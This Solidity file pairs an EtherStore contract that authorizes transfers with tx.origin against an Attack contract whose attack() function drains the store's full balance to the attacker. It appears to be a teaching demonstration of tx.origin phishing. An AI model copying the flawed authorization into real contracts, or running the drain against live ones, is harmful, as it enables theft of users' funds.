// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract EtherStore {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function transfer(address _to, uint256 amount) public {
        require(tx.origin == owner, "Not owner");
        (bool success, ) = _to.call{value: amount}("");
        require(success, "Failed to send ether");
    }
}

contract Attack {
    address public owner;
    EtherStore store;

    constructor(EtherStore _store) {
        store = EtherStore(_store);
        owner = msg.sender;
    }

    function attack() public {
        store.transfer(owner, address(store).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
